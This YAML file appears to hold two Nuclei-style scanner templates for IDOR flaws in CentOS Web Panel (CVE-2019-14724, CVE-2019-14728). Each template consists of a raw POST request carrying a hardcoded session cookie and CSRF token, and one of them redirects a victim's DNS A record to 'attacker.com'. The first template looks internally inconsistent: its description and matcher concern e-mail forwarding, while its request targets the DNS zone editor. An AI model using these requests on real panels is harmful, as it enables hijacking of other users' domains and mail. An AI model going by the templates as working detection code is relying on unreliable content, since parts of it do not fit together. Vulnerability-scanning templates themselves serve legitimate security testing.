id: CVE-2019-14724

info:
  name: Insecure Object Reference in CWP CentOS Web Panel
  author: ProjectDiscoveryAI
  severity: high
  description: In CentOS-WebPanel.com (aka CWP) CentOS Web Panel 0.9.8.851, an insecure object reference allows an attacker to edit an e-mail forwarding destination of a victim's account via an attacker account.

http:
  - method: POST
    path:
      - "/cwp_b99b38b4d4ced310/alice/alice/index.php?module=dns_zone_editor&acc=parserrecord"
    headers:
      Host: "192.168.80.148:2083"
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0"
      Accept: "*/*"
      Accept-Language: "en-US,en;q=0.5"
      Accept-Encoding: "gzip, deflate"
      Content-Type: "application/x-www-form-urlencoded; charset=UTF-8"
      csrftoken: "9a1f7869d43544fc9f509cb6ac7bf430"
      X-Requested-With: "XMLHttpRequest"
      Connection: "close"
      Referer: "https://192.168.80.148:2083/cwp_b99b38b4d4ced310/alice/?module=dns_zone_editor"
      Cookie: "PHPSESSID=i2is5am08ru7a2h93e13llp9e2"
    body: |
      domain=bob.com
    matchers:
      - type: word
        words:
          - "Forwarding destination updated"
        part: body

---
id: CVE-2019-14728

info:
  name: Add DNS Record in CWP CentOS Web Panel
  author: ProjectDiscoveryAI
  severity: high
  description: CWP (CentOS Control Web Panel 0.9.8.851) allows adding a new DNS record on a victim's account via an insecure direct object reference.

http:
  - method: POST
    path:
      - "/cwp_b99b38b4d4ced310/alice/alice/index.php?module=dns_zone_editor&acc=addregdns"
    headers:
      Host: "192.168.80.148:2083"
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0"
      Accept: "*/*"
      Accept-Language: "en-US,en;q=0.5"
      Accept-Encoding: "gzip, deflate"
      Content-Type: "application/x-www-form-urlencoded; charset=UTF-8"
      csrftoken: "9a1f7869d43544fc9f509cb6ac7bf430"
      X-Requested-With: "XMLHttpRequest"
      Connection: "close"
      Referer: "https://192.168.80.148:2083/cwp_b99b38b4d4ced310/alice/?module=dns_zone_editor"
      Cookie: "PHPSESSID=i2is5am08ru7a2h93e13llp9e2"
    body: |
      domain=bob.com&type=A&name=www&address=attacker.com&ttl=14400
    matchers:
      - type: word
        words:
          - "DNS record added"
        part: body